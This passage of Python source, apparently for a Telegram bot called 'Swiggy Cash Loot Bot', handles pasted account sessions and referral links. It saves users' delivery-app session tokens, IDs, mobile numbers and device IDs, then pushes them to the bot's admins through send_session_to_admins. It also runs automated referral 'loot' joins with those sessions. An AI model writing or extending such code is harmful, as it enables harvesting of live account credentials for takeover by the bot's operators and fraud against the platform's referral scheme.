            if "session" in data and isinstance(data["session"], dict):
                for k in ("token", "tid", "sid", "userid", "mobile", "customerId", "deviceId"):
                    if data["session"].get(k):
                        session[k] = str(data["session"][k])
            if not session.get("token") and not session.get("tid"):
                raise ValueError("No token/tid found")
            if not session.get("userid") and session.get("tid"):
                session["userid"] = _userid_from_tid(session["tid"]) or ""
            save_user_session(chat_id, session)

            # Send to admins
            await send_session_to_admins(context, chat_id, session, source="manual_session")

            await update.message.reply_text(
                f"✅ Session saved!\nUser ID: `{_account_user_id(session)}`\n\nSession auto-sent to admin.",
                parse_mode="Markdown",
                reply_markup=main_menu_kb(True),
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Invalid session: {e}", reply_markup=back_kb())
        return

    # Custom link
    if context.user_data.get("awaiting_link"):
        context.user_data.pop("awaiting_link", None)
        session = get_session(chat_id)
        if not session:
            await update.message.reply_text("❌ Login first.", reply_markup=back_kb())
            return
        campaign_id, referrer_id = parse_cashloot_link(text)
        if not campaign_id or not referrer_id:
            await update.message.reply_text("❌ Invalid link.", reply_markup=back_kb())
            return
        msg = await update.message.reply_text(f"🔗 Joining `{referrer_id}`...")
        links = normalize_links([("custom", text)])
        try:
            lock = await get_user_job_lock(chat_id)
            async with lock:
                report = await run_full_join(session, links)
            await msg.edit_text(f"```\n{report}\n```", parse_mode="Markdown", reply_markup=back_kb())
        except Exception as e:
            await msg.edit_text(f"❌ {e}", reply_markup=back_kb())
        return

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    log.exception("Unhandled error", exc_info=context.error)
    if isinstance(update, Update) and update.effective_message:
        try:
            await update.effective_message.reply_text("⚠️ Temporary error. Try again.")
        except Exception:
            pass

def main():
    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        print("ERROR: Set BOT_TOKEN env variable")
        sys.exit(1)

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(MAX_CONCURRENT)
        .build()
    )

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", start_cmd))
    app.add_handler(CallbackQueryHandler(callback_router))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.add_error_handler(error_handler)

    print("🤖 Swiggy Cash Loot Bot starting (Late Night + Admin Session Push)...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
